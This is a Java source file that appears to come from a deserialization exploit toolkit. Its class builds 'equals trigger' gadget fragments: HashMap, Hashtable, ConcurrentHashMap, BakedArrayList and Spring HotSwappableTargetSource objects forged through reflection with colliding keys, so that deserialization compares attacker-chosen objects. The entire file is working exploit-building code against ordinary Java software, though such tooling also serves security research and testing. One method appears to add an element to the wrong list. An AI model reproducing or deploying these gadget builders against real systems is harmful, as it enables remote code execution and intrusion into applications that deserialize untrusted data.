package gadgetFragment;

import clojure.lang.Obj;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.swing.BakedArrayList;
import util.Reflections;

import java.lang.reflect.Array;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList;

import static gadgetFragment.Entry2HashFragment.makeConMap;

public class Entry2EqualFragment {
    public static Object getEqualTrigger(Object o1, Object o2, int eqTriggerNumber) throws Exception {
        if (eqTriggerNumber == 0)
            return Entry2EqualFragment.makeHashMap2(o2, o1);
        else if (eqTriggerNumber == 1)
            return Entry2EqualFragment.makeHashtableMap2(o2, o1);
        else if (eqTriggerNumber == 2)
            return Entry2EqualFragment.makeConcurrentHashMap2(o1, o2);
        else if (eqTriggerNumber == 3)
            return Entry2EqualFragment.makeBakedArrayList(o2, o1);
        else if (eqTriggerNumber == 4)
            return Entry2EqualFragment.makeSimpleEntryToConMap(o1, o2);
        else if (eqTriggerNumber == 5)
            return makeHotSwappableTargetSource(o1, o2);
        else if (eqTriggerNumber == 7)
            return makeConEntry(o1, o2);

        return makeSimpleImmutableEntryToConMap(o1, o2);
    }

    public static Object makeHashMap2(Object o1, Object o2) throws Exception {
        Object hashMap = new HashMap<>();

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",o2);
        map1.put("zZ",o1);
        map2.put("yy",o1);
        map2.put("zZ",o2);

        Object node1 = Reflections.createWithoutConstructor(Class.forName("java.util.HashMap$Node"));
        Reflections.setFieldValue(node1, "key", map1);
        Reflections.setFieldValue(node1, "value", "1");

        Object node2 = Reflections.createWithoutConstructor(Class.forName("java.util.HashMap$Node"));
        Reflections.setFieldValue(node2, "key", map2);
        Reflections.setFieldValue(node2, "value", "1");

        Object hashMapTbl = Array.newInstance(Class.forName("java.util.HashMap$Node"), 2);
        Array.set(hashMapTbl, 0, node1);
        Array.set(hashMapTbl, 1, node2);

        Reflections.setFieldValue(hashMap, "table", hashMapTbl);
        Reflections.setFieldValue(hashMap, "size", 2);

        return hashMap;

    }

    public static Object makeConcurrentHashMap2(Object o1, Object o2) throws Exception {
        Object conHashMap = new ConcurrentHashMap<Object,Object>();

        ConcurrentHashMap map1 = new ConcurrentHashMap();
        ConcurrentHashMap map2 = new ConcurrentHashMap();
        map1.put("yy",o2);
        map1.put("zZ",o1);
        map2.put("yy",o1);
        map2.put("zZ",o2);

        Object node1 = Reflections.createWithoutConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"));
        Reflections.setFieldValue(node1, "key", map1);
        Reflections.setFieldValue(node1, "val", "1");

        Object node2 = Reflections.createWithoutConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"));
        Reflections.setFieldValue(node2, "key", map2);
        Reflections.setFieldValue(node2, "val", "1");

        Object conHashMapTbl = Array.newInstance(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"), 2);
        Array.set(conHashMapTbl, 0, node1);
        Array.set(conHashMapTbl, 1, node2);

        Reflections.setFieldValue(conHashMap, "table", conHashMapTbl);
        Reflections.setFieldValue(conHashMap, "sizeCtl", 2);



        return conHashMap;
    }

    public static Object makeHashtableMap2(Object o1, Object o2) throws Exception {
        Object hTbl = new Hashtable<>();

        Hashtable map1 = new Hashtable(); // Hashtable
        Hashtable map2 = new Hashtable();
        map1.put("yy",o2);
        map1.put("zZ",o1);
        map2.put("yy",o1);
        map2.put("zZ",o2);

        // Hashtable.Entry

        Object entry1 = Reflections.createWithoutConstructor(Class.forName("java.util.Hashtable$Entry"));
        Reflections.setFieldValue(entry1, "key", map1);
        Reflections.setFieldValue(entry1, "value", "1");

        Object entry2 = Reflections.createWithoutConstructor(Class.forName("java.util.Hashtable$Entry"));
        Reflections.setFieldValue(entry2, "key", map2);
        Reflections.setFieldValue(entry2, "value", "1");

        Object tbl = Array.newInstance(Class.forName("java.util.Hashtable$Entry"), 2);
        Array.set(tbl, 0, entry1);
        Array.set(tbl, 1, entry2);

        Reflections.setFieldValue(hTbl, "table", tbl);
        Reflections.setFieldValue(hTbl, "count", 2);

        return hTbl;
    }

    public static Object makeSimpleEntryToConMap(Object o1, Object o2) throws Exception{
        AbstractMap.SimpleEntry simpleEntry1 = new AbstractMap.SimpleEntry(o1, o2);
        AbstractMap.SimpleEntry simpleEntry2 = new AbstractMap.SimpleEntry(o2, o1);

        return makeConMap(simpleEntry1, simpleEntry2);
    }

    public static Object makeSimpleImmutableEntryToConMap(Object o1, Object o2) throws Exception{
        AbstractMap.SimpleImmutableEntry simpleEntry1 = new AbstractMap.SimpleImmutableEntry(o1, o2);
        AbstractMap.SimpleImmutableEntry simpleEntry2 = new AbstractMap.SimpleImmutableEntry(o2, o1);

        return makeConMap(simpleEntry1, simpleEntry2);
    }

    public static Object makeBakedArrayList(Object o1, Object o2) throws Exception {
        List elementData1 = new LinkedList();
        elementData1.add(o1);
        List elementData2 = new LinkedList();
        elementData1.add(o2);
        BakedArrayList bakedArrayList1 = new BakedArrayList(elementData1);
        BakedArrayList bakedArrayList2 = new BakedArrayList(elementData2);
        Reflections.setFieldValue(bakedArrayList1,"_hashCode",1);
        Reflections.setFieldValue(bakedArrayList2,"_hashCode",1);

        return makeConMap(bakedArrayList1, bakedArrayList2);
    }

    public static Object makeHotSwappableTargetSource(Object o1, Object o2) throws Exception {
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(o1);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(o2);
        return makeConMap(hotSwappableTargetSource1, hotSwappableTargetSource2);
    }

    public static Object makeConEntry(Object o1, Object o2) throws Exception {
        Object conEntry1 = Reflections.createWithObjectNoArgsConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"));
        Object conEntry2 = Reflections.createWithObjectNoArgsConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"));

        Reflections.setFieldValue(conEntry1, "key", o1);
        Reflections.setFieldValue(conEntry1, "val", o2);

        Reflections.setFieldValue(conEntry2, "key", o2);
        Reflections.setFieldValue(conEntry2, "val", o1);
        return makeConMap(conEntry1, conEntry2);
    }
}
